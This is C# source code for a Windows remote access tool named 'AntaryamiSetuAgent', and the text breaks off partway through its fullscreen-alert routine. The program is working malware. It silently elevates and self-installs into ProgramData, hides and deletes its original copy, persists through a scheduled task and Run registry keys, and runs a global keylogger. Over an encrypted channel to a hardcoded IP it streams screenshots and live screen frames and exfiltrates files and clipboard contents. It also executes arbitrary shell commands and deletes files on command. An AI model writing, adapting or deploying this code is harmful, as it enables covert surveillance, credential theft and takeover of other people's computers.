using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Text.Json;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using Microsoft.Win32;
using System.Runtime.Versioning;
using System.Speech.Synthesis;
using System.Diagnostics.Eventing.Reader;

namespace AntaryamiSetuAgent
{
    [SupportedOSPlatform("windows")]
    class Program
    {
        // =========================================================
        // OFFLINE CONFIGURATION (Change localhost to your Admin local IP)
        // =========================================================
        private static string ServerIp = "172.19.15.126";
        private static readonly int ServerPort = 9999;
        
        private static string _deviceId = string.Empty;
        private static TcpClient? _client;
        private static NetworkStream? _stream;
        private static readonly object _sendLock = new object();
        private static bool _isConnected = false;
        
        // Screen stream variables
        private static bool _isScreenStreaming = false;
        private static int _screenFps = 10;
        private static int _screenQuality = 60;
        private static readonly object _screenLock = new object();

        // Keylogger variables
        private static readonly object _keyLock = new object();
        private static readonly StringBuilder _keyBuffer = new StringBuilder();
        private static string _lastWindow = string.Empty;
        private static IntPtr _hookId = IntPtr.Zero;
        private static LowLevelKeyboardProc? _kbHookProc;
        private static bool _isKeylogging = false;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int vKey);

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public POINT pt;
            public uint lPrivate;
        }

        [DllImport("user32.dll")]
        private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll")]
        private static extern bool TranslateMessage(ref MSG lpMsg);

        [DllImport("user32.dll")]
        private static extern IntPtr DispatchMessage(ref MSG lpMsg);

        // Native APIs for Screen Handle and Active Window
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
        
        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        static async Task Main(string[] args)
        {
            try { Application.SetHighDpiMode(HighDpiMode.PerMonitorV2); } catch { }
            PerformSelfInstallation(args);

            _deviceId = GetHardwareBoundIdentifier();
            
            // Startup Persistence
            RegisterInStartup();

            // Futuristic welcome audio chime
            // PlayFuturisticStartupBeep();

            // Start global keyboard hook thread
            StartKeylogger();

            var cts = new CancellationTokenSource();
            
            // Start the main engine loop (Handles connecting, telemetry, and receiving commands)
            await StartAgentEngineAsync(cts.Token);
        }

        private static void PerformSelfInstallation(string[] args)
        {
            try
            {
                string currentPath = Process.GetCurrentProcess().MainModule?.FileName ?? string.Empty;
                if (currentPath.Contains("ANTARYAMI-SETU", StringComparison.OrdinalIgnoreCase) || currentPath.Contains("bin\\Debug", StringComparison.OrdinalIgnoreCase))
                {
                    return; // Bypass installation check for local debugging/development
                }

                string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "OfflineAgent");
                string targetPath = Path.Combine(targetDir, "AntaryamiSetuAgent.exe");

                if (string.IsNullOrEmpty(currentPath)) return;

                // Check if we are running from the target path
                if (string.Equals(currentPath, targetPath, StringComparison.OrdinalIgnoreCase))
                {
                    return; // Already installed, continue running
                }

                // Check for Administrator elevation
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                bool isAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

                if (!isAdmin)
                {
                    // Elevate
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = currentPath,
                        Arguments = string.Join(" ", args),
                        UseShellExecute = true,
                        Verb = "runas"
                    });
                    Environment.Exit(0);
                }

                // Stop active process if any
                foreach (var process in Process.GetProcessesByName("AntaryamiSetuAgent"))
                {
                    if (process.Id != Process.GetCurrentProcess().Id)
                    {
                        try
                        {
                            process.Kill();
                            process.WaitForExit(3000);
                        }
                        catch { }
                    }
                }

                // Provision directory
                if (!Directory.Exists(targetDir))
                {
                    Directory.CreateDirectory(targetDir);
                }

                // Copy to ProgramData
                File.Copy(currentPath, targetPath, true);

                // Launch in session 1 (hidden)
                Process.Start(new ProcessStartInfo
                {
                    FileName = targetPath,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                // Self-clean temporary file
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c choice /t 3 /d y > nul & del \"{currentPath}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });

                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Self-installation failed: {ex.Message}");
            }
        }

        // =========================================================
        // PERSISTENCE & STARTUP
        // =========================================================
        private static void RegisterInStartup()
        {
            try
            {
                string? appPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(appPath)) return;
                
                string appName = Path.GetFileNameWithoutExtension(appPath);

                if (!string.IsNullOrEmpty(appPath))
                {
                    // 1. Advanced Persistence: Hidden Scheduled Task (Elevated)
                    try
                    {
                        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                        var principal = new System.Security.Principal.WindowsPrincipal(identity);
                        bool isAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

                        if (isAdmin)
                        {
                            // Create scheduled task (on logon)
                            string taskCmd = $"/create /tn \"{appName}Task\" /tr \"\\\"{appPath}\\\"\" /sc onlogon /rl highest /f";
                            var startInfo = new ProcessStartInfo
                            {
                                FileName = "schtasks.exe",
                                Arguments = taskCmd,
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden
                            };
                            using (var proc = Process.Start(startInfo))
                            {
                                proc?.WaitForExit(5000);
                            }

                            // Remove battery constraints from scheduled task using PowerShell
                            try
                            {
                                string settingsCmd = $"Set-ScheduledTask -TaskName \"{appName}Task\" -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)";
                                var psStartInfo = new ProcessStartInfo
                                {
                                    FileName = "powershell.exe",
                                    Arguments = $"-NoProfile -WindowStyle Hidden -Command \"{settingsCmd}\"",
                                    CreateNoWindow = true,
                                    UseShellExecute = false
                                };
                                using (var psProc = Process.Start(psStartInfo))
                                {
                                    psProc?.WaitForExit(5000);
                                }
                            }
                            catch { }
                        }
                    }
                    catch { }

                    // 2. Registry Persistence (HKLM for System-Wide if Admin, HKCU for User fallback)
                    try
                    {
                        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                        var principal = new System.Security.Principal.WindowsPrincipal(identity);
                        bool isAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

                        if (isAdmin)
                        {
                            using (RegistryKey? key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                            {
                                if (key != null)
                                {
                                    string? existingValue = key.GetValue(appName)?.ToString();
                                    if (existingValue != appPath)
                                    {
                                        key.SetValue(appName, appPath);
                                    }
                                }
                            }
                        }
                    }
                    catch { }

                    try
                    {
                        using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                        {
                            if (key != null)
                            {
                                string? existingValue = key.GetValue(appName)?.ToString();
                                if (existingValue != appPath)
                                {
                                    key.SetValue(appName, appPath);
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        // =========================================================
        // NATIVE SIGNALS & AUDIO
        // =========================================================
        private static void PlayFuturisticStartupBeep()
        {
            try
            {
                Console.Beep(880, 100);
                Thread.Sleep(50);
                Console.Beep(1109, 100);
                Thread.Sleep(50);
                Console.Beep(1320, 150);
            }
            catch { }
        }

        private static void TriggerCustomBeep(int frequency, int duration)
        {
            try
            {
                if (frequency >= 37 && frequency <= 32767 && duration > 0)
                {
                    Console.Beep(frequency, duration);
                }
            }
            catch { }
        }

        private static void SpeakOfflineText(string message)
        {
            try
            {
                Task.Run(() =>
                {
                    using (var synth = new SpeechSynthesizer())
                    {
                        synth.Volume = 100;
                        synth.Rate = 0;
                        synth.Speak(message);
                    }
                });
            }
            catch { }
        }

        // =========================================================
        // AGENT CONNECTION ENGINE & PROTOCOL
        // =========================================================
        private static async Task StartAgentEngineAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                if (!_isConnected)
                {
                    try
                    {
                        Console.WriteLine($"[*] Connecting to Admin Server at {ServerIp}:{ServerPort}...");
                        _client = new TcpClient();
                        await _client.ConnectAsync(ServerIp, ServerPort, token);
                        _stream = _client.GetStream();
                        _isConnected = true;
                        Console.WriteLine("[+] Connected to Admin successfully!");

                        // Start Receive and Telemetry loops
                        _ = Task.Run(() => ReceiveLoopAsync(token), token);
                        _ = Task.Run(() => TelemetryLoopAsync(token), token);
                        _ = Task.Run(() => KeyloggerStreamLoopAsync(token), token);
                    }
                    catch
                    {
                        Console.WriteLine("[-] Connection failed. Retrying in 5 seconds...");
                        _isConnected = false;
                        await Task.Delay(5000, token);
                    }
                }
                else
                {
                    await Task.Delay(2000, token);
                }
            }
        }

        private static void SendPacket(byte type, byte[] payload)
        {
            if (!_isConnected || _stream == null) return;

            lock (_sendLock)
            {
                try
                {
                    byte[] encryptedPayload = EncryptionUtil.Encrypt(payload);
                    byte[] packet = new byte[5 + encryptedPayload.Length];
                    packet[0] = type;
                    Array.Copy(BitConverter.GetBytes(encryptedPayload.Length), 0, packet, 1, 4);
                    Array.Copy(encryptedPayload, 0, packet, 5, encryptedPayload.Length);

                    _stream.Write(packet, 0, packet.Length);
                    _stream.Flush();
                }
                catch
                {
                    _isConnected = false;
                }
            }
        }

        private static async Task TelemetryLoopAsync(CancellationToken token)
        {
            while (_isConnected && !token.IsCancellationRequested)
            {
                try
                {
                    var telemetry = new Dictionary<string, string>
                    {
                        { "device_id", _deviceId },
                        { "device_name", Environment.MachineName + " (" + Environment.UserName + ")" },
                        { "os_info", Environment.OSVersion.VersionString },
                        { "active_app", GetActiveWindowTitle() },
                        { "current_path", Directory.GetCurrentDirectory() }
                    };

                    string jsonString = JsonSerializer.Serialize(telemetry);
                    byte[] payload = Encoding.UTF8.GetBytes(jsonString);

                    SendPacket(1, payload); // Type 1 = Telemetry
                }
                catch { }

                await Task.Delay(10000, token); // Every 10s
            }
        }

        private static async Task ReceiveLoopAsync(CancellationToken token)
        {
            byte[] headerBuffer = new byte[5];

            while (_isConnected && !token.IsCancellationRequested)
            {
                try
                {
                    int bytesRead = 0;
                    while (bytesRead < 5)
                    {
                        int read = await _stream!.ReadAsync(headerBuffer, bytesRead, 5 - bytesRead, token);
                        if (read == 0) throw new IOException("Disconnected from Server.");
                        bytesRead += read;
                    }

                    byte type = headerBuffer[0];
                    int length = BitConverter.ToInt32(headerBuffer, 1);

                    byte[] payload = new byte[length];
                    int payloadRead = 0;
                    while (payloadRead < length)
                    {
                        int read = await _stream!.ReadAsync(payload, payloadRead, length - payloadRead, token);
                        if (read == 0) throw new IOException("Disconnected from Server during payload transfer.");
                        payloadRead += read;
                    }

                    payload = EncryptionUtil.Decrypt(payload);
                    if (payload.Length == 0) throw new IOException("Decryption failed or empty payload.");

                    if (type == 2) // Command packet
                    {
                        string rawCommand = Encoding.UTF8.GetString(payload);
                        _ = Task.Run(() => ProcessCommandAsync(rawCommand, token), token);
                    }
                    else if (type == 6) // File Upload
                    {
                        try
                        {
                            if (payload.Length > 4)
                            {
                                int fnLength = BitConverter.ToInt32(payload, 0);
                                string filename = Encoding.UTF8.GetString(payload, 4, fnLength);
                                int dataIdx = 4 + fnLength;
                                int dataLen = payload.Length - dataIdx;
                                byte[] fileBytes = new byte[dataLen];
                                Array.Copy(payload, dataIdx, fileBytes, 0, dataLen);

                                string savePath = Path.Combine(Directory.GetCurrentDirectory(), filename);
                                try {
                                    File.WriteAllBytes(savePath, fileBytes);
                                } catch (UnauthorizedAccessException) {
                                    savePath = Path.Combine(Path.GetTempPath(), filename);
                                    File.WriteAllBytes(savePath, fileBytes);
                                }
                                SendOutput($"[+] File received and saved: {savePath} ({dataLen / 1024.0:F2} KB)");
                            }
                        }
                        catch (Exception ex)
                        {
                            SendOutput($"[-] File receive error: {ex.Message}");
                        }
                    }
                }
                catch
                {
                    Console.WriteLine("[-] Connection lost in receive loop.");
                    _isConnected = false;
                    break;
                }
            }
        }

        private static async Task ProcessCommandAsync(string command, CancellationToken token)
        {
            try
            {
                Console.WriteLine($"[*] Executing Command: {command}");

                // 1. Speak Text-to-Speech
                if (command.StartsWith("speak ", StringComparison.OrdinalIgnoreCase))
                {
                    string textToSpeak = command.Substring(6).Trim();
                    SpeakOfflineText(textToSpeak);
                    SendOutput($"[+] Client speaking initiated: \"{textToSpeak}\"");
                }
                // 2. Beep Custom Audio
                else if (command.StartsWith("beep ", StringComparison.OrdinalIgnoreCase))
                {
                    string[] parts = command.Substring(5).Split(' ', StringSplitOptions.RemoveEmptyEntries);
                    int freq = 1000;
                    int dur = 300;
                    if (parts.Length >= 2 && int.TryParse(parts[0], out int f) && int.TryParse(parts[1], out int d))
                    {
                        freq = f;
                        dur = d;
                    }
                    TriggerCustomBeep(freq, dur);
                    SendOutput($"[+] Custom beep played: {freq}Hz for {dur}ms.");
                }
                // 3. Directory Context Navigation
                else if (command.StartsWith("cd ", StringComparison.OrdinalIgnoreCase))
                {
                    string targetPath = command.Substring(3).Trim();
                    Directory.SetCurrentDirectory(targetPath);
                    SendOutput($"[*] Context Directory: {Directory.GetCurrentDirectory()}");
                }
                // 4. Cat File
                else if (command.StartsWith("cat ", StringComparison.OrdinalIgnoreCase))
                {
                    string filePath = command.Substring(4).Trim();
                    if (File.Exists(filePath))
                    {
                        string content = await File.ReadAllTextAsync(filePath, token);
                        SendOutput(content);
                    }
                    else
                    {
                        SendOutput($"[-] File not found: {filePath}");
                    }
                }
                // 5. Capture Screenshot
                else if (command.Equals("screenshot", StringComparison.OrdinalIgnoreCase))
                {
                    await CaptureScreenshotAsync(token);
                }
                // 5.1. Remote Screen Sharing Start
                else if (command.StartsWith("screen_start", StringComparison.OrdinalIgnoreCase))
                {
                    string[] parts = command.Split(' ');
                    int fps = 10;
                    int qual = 60;
                    if (parts.Length >= 2 && int.TryParse(parts[1], out int f)) fps = f;
                    if (parts.Length >= 3 && int.TryParse(parts[2], out int q)) qual = q;

                    lock (_screenLock)
                    {
                        _screenFps = fps;
                        _screenQuality = qual;
                        if (!_isScreenStreaming)
                        {
                            _isScreenStreaming = true;
                            _ = Task.Run(() => ScreenStreamLoopAsync(token), token);
                        }
                    }
                    SendOutput("[+] Screen streaming started.");
                }
                // 5.2. Remote Screen Sharing Stop
                else if (command.Equals("screen_stop", StringComparison.OrdinalIgnoreCase))
                {
                    lock (_screenLock)
                    {
                        _isScreenStreaming = false;
                    }
                    SendOutput("[+] Screen streaming stopped.");
                }
                 // 6. Exfiltrate File (Pull)
                 else if (command.StartsWith("pull ", StringComparison.OrdinalIgnoreCase))
                 {
                     string targetFilePath = command.Substring(5).Trim();
                     await ExfiltrateFileAsync(targetFilePath, token);
                 }
                 // 6.1. File Manager: List Directory
                 else if (command.StartsWith("fm_list ", StringComparison.OrdinalIgnoreCase))
                 {
                     string path = command.Substring(8).Trim();
                     _ = Task.Run(() => HandleFileManagerList(path), token);
                 }
                 // 6.2. File Manager: Delete File/Folder
                 else if (command.StartsWith("fm_delete ", StringComparison.OrdinalIgnoreCase))
                 {
                     string path = command.Substring(10).Trim();
                     try
                     {
                         if (Directory.Exists(path))
                         {
                             Directory.Delete(path, true);
                             SendOutput($"[+] Folder deleted: {path}");
                         }
                         else if (File.Exists(path))
                         {
                             File.Delete(path);
                             SendOutput($"[+] File deleted: {path}");
                         }
                         else
                         {
                             SendOutput($"[-] Target delete path does not exist: {path}");
                         }
                     }
                     catch (Exception ex)
                     {
                         SendOutput($"[-] Delete error: {ex.Message}");
                     }
                 }
                 // 6.3. File Manager: Rename File/Folder
                 else if (command.StartsWith("fm_rename ", StringComparison.OrdinalIgnoreCase))
                 {
                     string payloadStr = command.Substring(10).Trim();
                     string[] parts = payloadStr.Split('|');
                     if (parts.Length == 2)
                     {
                         try
                         {
                             string oldPath = parts[0];
                             string newPath = parts[1];

                             if (Directory.Exists(oldPath))
                             {
                                 Directory.Move(oldPath, newPath);
                                 SendOutput($"[+] Directory renamed: {Path.GetFileName(oldPath)} to {Path.GetFileName(newPath)}");
                             }
                             else if (File.Exists(oldPath))
                             {
                                 File.Move(oldPath, newPath);
                                 SendOutput($"[+] File renamed: {Path.GetFileName(oldPath)} to {Path.GetFileName(newPath)}");
                             }
                             else
                             {
                                 SendOutput("[-] Source rename target not found.");
                             }
                         }
                         catch (Exception ex)
                         {
                             SendOutput($"[-] Rename error: {ex.Message}");
                         }
                     }
                     else
                     {
                         SendOutput("[-] Invalid rename arguments.");
                     }
                 }
                 // 6.4. Clipboard: Read
                 else if (command.Equals("clip_get", StringComparison.OrdinalIgnoreCase))
                 {
                     _ = Task.Run(() => {
                         string clipText = string.Empty;
                         var thread = new Thread(() => {
                             try
                             {
                                 clipText = System.Windows.Forms.Clipboard.GetText();
                             }
                             catch { }
                         });
                         thread.SetApartmentState(ApartmentState.STA);
                         thread.Start();
                         thread.Join();

                         SendPacket(10, Encoding.UTF8.GetBytes(clipText));
                     });
                 }
                 // 6.5. Clipboard: Write
                 else if (command.StartsWith("clip_set ", StringComparison.OrdinalIgnoreCase))
                 {
                     string textToSet = command.Substring(9);
                     _ = Task.Run(() => {
                         var thread = new Thread(() => {
                             try
                             {
                                 System.Windows.Forms.Clipboard.SetText(textToSet);
                             }
                             catch { }
                         });
                         thread.SetApartmentState(ApartmentState.STA);
                         thread.Start();
                         thread.Join();

                         SendOutput("[+] Target Clipboard updated successfully.");
                     });
                 }
                 else if (command.StartsWith("alert ", StringComparison.OrdinalIgnoreCase))
                 {
                     string alertMessage = command.Substring(6).Trim();
                     ShowFullscreenAlert(alertMessage);
                     SendOutput($"[+] Fullscreen alert displayed on target: \"{alertMessage}\"");
                 }
                 else if (command.Equals("keylog_start", StringComparison.OrdinalIgnoreCase))
                 {
                     lock (_keyLock)
                     {
                         _keyBuffer.Clear();
                         _isKeylogging = true;
                     }
                     SendOutput("[+] Keylogger streaming active.");
                 }
                 else if (command.Equals("keylog_stop", StringComparison.OrdinalIgnoreCase))
                 {
                     lock (_keyLock)
                     {
                         _isKeylogging = false;
                         _keyBuffer.Clear();
                     }
                     SendOutput("[+] Keylogger streaming stopped.");
                 }
                 else if (command.Equals("usb_history", StringComparison.OrdinalIgnoreCase))
                 {
                     _ = Task.Run(() => {
                         try
                         {
                             StringBuilder sb = new StringBuilder();
                             sb.AppendLine("=== USB DEVICE HISTORY ===");
                             using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Enum\USBSTOR"))
                             {
                                 if (key != null)
                                 {
                                     foreach (string v in key.GetSubKeyNames())
                                     {
                                         sb.AppendLine($"Device: {v}");
                                         using (RegistryKey subKey = key.OpenSubKey(v))
                                         {
                                             if (subKey != null)
                                             {
                                                 foreach (string id in subKey.GetSubKeyNames())
                                                 {
                                                     using (RegistryKey deviceKey = subKey.OpenSubKey(id))
                                                     {
                                                         if (deviceKey != null)
                                                         {
                                                             string friendlyName = deviceKey.GetValue("FriendlyName")?.ToString() ?? "Unknown";
                                                             sb.AppendLine($"  -> S/N: {id} | Name: {friendlyName}");
                                                         }
                                                     }
                                                 }
                                             }
                                         }
                                         sb.AppendLine(new string('-', 30));
                                     }
                                 }
                                 else
                                 {
                                     sb.AppendLine("No USB history found or insufficient privileges.");
                                 }
                             }
                             SendOutput(sb.ToString());
                         }
                         catch (Exception ex)
                         {
                             SendOutput($"[-] USB History error: {ex.Message}");
                         }
                     });
                 }
                 else if (command.Equals("event_logs", StringComparison.OrdinalIgnoreCase))
                 {
                     _ = Task.Run(() => {
                         DumpEventLogs();
                     });
                 }
                 else if (command.Equals("uninstall", StringComparison.OrdinalIgnoreCase))
                 {
                     SendOutput("[+] Uninstallation initiated. Cleaning up and self-destructing.");
                     SelfDestruct();
                     return;
                 }

                // 7. Generic CMD commands execution
                else
                {
                    bool requiresPowerShell = command.Contains("iwr") || command.Contains("wget") || command.Contains("curl");
                    string shellExecutor = requiresPowerShell ? "powershell.exe" : "cmd.exe";
                    string processingArguments = requiresPowerShell ? $"-Command \"{command}\"" : $"/c {command}";

                    using var systemProcess = new Process();
                    systemProcess.StartInfo = new ProcessStartInfo
                    {
                        FileName = shellExecutor,
                        Arguments = processingArguments,
                        WorkingDirectory = Directory.GetCurrentDirectory(),
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };

                    using var ctsTimeout = new CancellationTokenSource(60000);
                    using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(token, ctsTimeout.Token);

                    systemProcess.Start();

                    try
                    {
                        await systemProcess.WaitForExitAsync(linkedCts.Token);
                        string stdout = await systemProcess.StandardOutput.ReadToEndAsync(linkedCts.Token);
                        string stderr = await systemProcess.StandardError.ReadToEndAsync(linkedCts.Token);
                        
                        string outputResult = !string.IsNullOrEmpty(stdout) ? stdout : stderr;
                        if (string.IsNullOrEmpty(outputResult)) outputResult = "[*] Execution complete with null output streams.";
                        
                        SendOutput($"{outputResult}\n\n[*] Context Directory: {Directory.GetCurrentDirectory()}");
                    }
                    catch (OperationCanceledException)
                    {
                        if (ctsTimeout.IsCancellationRequested)
                        {
                            try { systemProcess.Kill(true); } catch { }
                            SendOutput("[-] Execution Timeout: Process forcefully terminated after 60 seconds.");
                        }
                        else
                        {
                            throw;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                SendOutput($"[-] Task abort exception: {ex.Message}");
            }
        }

        private static void SendOutput(string text)
        {
            byte[] payload = Encoding.UTF8.GetBytes(text);
            SendPacket(3, payload); // Type 3 = Console Output
        }

        // =========================================================
        // SCREENSHOT GRABBER
        // =========================================================
        private static async Task CaptureScreenshotAsync(CancellationToken token)
        {
            try
            {
                IntPtr desktopHandle = GetDesktopWindow();
                if (desktopHandle == IntPtr.Zero)
                {
                    SendOutput("[-] VISUAL_FAIL: Desktop window handle unavailable.");
                    return;
                }

                IntPtr hdc = GetWindowDC(desktopHandle);
                if (hdc == IntPtr.Zero)
                {
                    SendOutput("[-] VISUAL_FAIL: Device context handle is null.");
                    return;
                }

                int width = GetDeviceCaps(hdc, 8);
                int height = GetDeviceCaps(hdc, 10);
                ReleaseDC(desktopHandle, hdc);

                if (width <= 0 || height <= 0)
                {
                    SendOutput("[-] VISUAL_FAIL: Invalid screen dimensions.");
                    return;
                }

                using var bitmap = new Bitmap(width, height);
                using (var g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);
                }

                using var stream = new MemoryStream();
                bitmap.Save(stream, ImageFormat.Jpeg);
                byte[] rawBytes = stream.ToArray();

                SendPacket(4, rawBytes); // Type 4 = Screenshot image
            }
            catch (Exception ex)
            {
                SendOutput($"[-] Screenshot creation failed: {ex.Message}");
            }
        }

        private static async Task ScreenStreamLoopAsync(CancellationToken token)
        {
            while (true)
            {
                bool isRunning;
                int fps;
                int quality;
                lock (_screenLock)
                {
                    isRunning = _isScreenStreaming && _isConnected;
                    fps = _screenFps;
                    quality = _screenQuality;
                }

                if (!isRunning || token.IsCancellationRequested)
                {
                    break;
                }

                try
                {
                    IntPtr desktopHandle = GetDesktopWindow();
                    if (desktopHandle != IntPtr.Zero)
                    {
                        IntPtr hdc = GetWindowDC(desktopHandle);
                        if (hdc != IntPtr.Zero)
                        {
                            int width = GetDeviceCaps(hdc, 8);
                            int height = GetDeviceCaps(hdc, 10);
                            ReleaseDC(desktopHandle, hdc);

                            if (width > 0 && height > 0)
                            {
                                using var bitmap = new Bitmap(width, height);
                                using (var g = Graphics.FromImage(bitmap))
                                {
                                    g.CopyFromScreen(0, 0, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);
                                }

                                using var stream = new MemoryStream();
                                var encoder = GetEncoder(ImageFormat.Jpeg);
                                if (encoder != null)
                                {
                                    var parameters = new EncoderParameters(1);
                                    parameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)quality);
                                    bitmap.Save(stream, encoder, parameters);
                                }
                                else
                                {
                                    bitmap.Save(stream, ImageFormat.Jpeg);
                                }

                                byte[] rawBytes = stream.ToArray();
                                SendPacket(8, rawBytes); // Type 8 = Live Screen Frame
                            }
                        }
                    }
                }
                catch { }

                int delay = 1000 / fps;
                if (delay < 30) delay = 30; // Min delay
                await Task.Delay(delay, token);
            }
        }

        private static ImageCodecInfo? GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        // =========================================================
        // FILE TRANSFER (EXFIL)
        // =========================================================
        private static async Task ExfiltrateFileAsync(string filePath, CancellationToken token)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    SendOutput($"[-] EXFIL_FAIL: File not found: {filePath}");
                    return;
                }

                FileInfo fileInfo = new FileInfo(filePath);
                if (fileInfo.Length > 52428800)
                {
                    SendOutput($"[-] EXFIL_FAIL: File size exceeds 50MB limit.");
                    return;
                }

                byte[] fileBytes = await File.ReadAllBytesAsync(filePath, token);
                string filename = Path.GetFileName(filePath);
                byte[] fnBytes = Encoding.UTF8.GetBytes(filename);

                // Build custom exfiltration payload:
                // 4 Bytes: Int32 Filename Length
                // N Bytes: Filename bytes
                // Remaining: File content bytes
                byte[] payload = new byte[4 + fnBytes.Length + fileBytes.Length];
                Array.Copy(BitConverter.GetBytes(fnBytes.Length), 0, payload, 0, 4);
                Array.Copy(fnBytes, 0, payload, 4, fnBytes.Length);
                Array.Copy(fileBytes, 0, payload, 4 + fnBytes.Length, fileBytes.Length);

                SendPacket(5, payload); // Type 5 = File Transfer
            }
            catch (Exception ex)
            {
                SendOutput($"[-] EXFIL_ERROR: {ex.Message}");
            }
        }

        private static void MinimizeAllWindows()
        {
            try
            {
                Type? shellType = Type.GetTypeFromProgID("Shell.Application");
                if (shellType != null)
                {
                    object? shell = Activator.CreateInstance(shellType);
                    if (shell != null)
                    {
                        shellType.InvokeMember("MinimizeAll", System.Reflection.BindingFlags.InvokeMethod, null, shell, null);
                    }
                }
            }
            catch { }
        }

        private static void ShowFullscreenAlert(string message)
        {
            try
            {
                MinimizeAllWindows();
                Thread alertThread = new Thread(() =>
                {
                    var screens = System.Windows.Forms.Screen.AllScreens;
                    var forms = new System.Collections.Generic.List<Form>();
                    bool isClosingAll = false;

                    void CloseAllForms()
                    {
                        if (isClosingAll) return;
                        isClosingAll = true;
                        foreach (var f in forms)
                        {
                            try { f.Close(); } catch {}
                        }
                    }

                    // Shared blinking timer
                    System.Windows.Forms.Timer blinkTimer = new System.Windows.Forms.Timer { Interval = 500 };
                    bool isRed = false;
                    blinkTimer.Tick += (s, e) =>
                    {
                        Color bg = isRed ? Color.FromArgb(10, 10, 10) : Color.FromArgb(120, 10, 10);
                        foreach (var f in forms)
                        {
                            try { f.BackColor = bg; } catch {}
                        }
                        isRed = !isRed;
                    };
                    blinkTimer.Start();

                    foreach (var screen in screens)
                    {
                        Form alertForm = new Form
                        {
                            Text = "",
                            FormBorderStyle = FormBorderStyle.None,
                            BackColor = Color.FromArgb(10, 10, 10),
                            TopMost = true,
                            StartPosition = FormStartPosition.Manual,
                            Bounds = screen.Bounds,
                            ShowInTaskbar = false
                        };

                        alertForm.Load += (s, e) => {
                            alertForm.WindowState = FormWindowState.Normal;
                            alertForm.Bounds = screen.Bounds;
                        };

                        alertForm.Shown += (s, e) => {
                            alertForm.Bounds = screen.Bounds;
                        };

                        alertForm.FormClosing += (s, e) => {
                            CloseAllForms();
                        };

                        // Main layout panel
                        TableLayoutPanel layout = new TableLayoutPanel
                        {
                            Dock = DockStyle.Fill,
                            ColumnCount = 1,
                            RowCount = 4,
                            BackColor = Color.Transparent
